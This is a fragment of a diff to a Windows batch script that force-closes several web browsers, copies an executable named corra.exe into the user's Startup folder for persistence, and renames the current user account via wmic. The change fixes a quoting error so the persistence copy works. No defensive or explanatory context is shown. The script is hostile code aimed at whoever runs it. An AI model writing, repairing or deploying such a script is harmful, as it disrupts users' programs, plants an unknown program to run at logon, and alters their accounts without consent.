@@ -5,8 +5,7 @@ taskkill /f /im chrome.exe
 taskkill /f /im iexplorer.exe
 taskkill /f /im firefox.exe
 taskkill /f /im opera.exe
-copy %temp%\corra.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\corra.exe
-"
+copy %temp%\corra.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\corra.exe"
 
 wmic useraccount where name='%username%' set FullName='i like u'
 wmic useraccount where name='%username%' rename 'i like u'
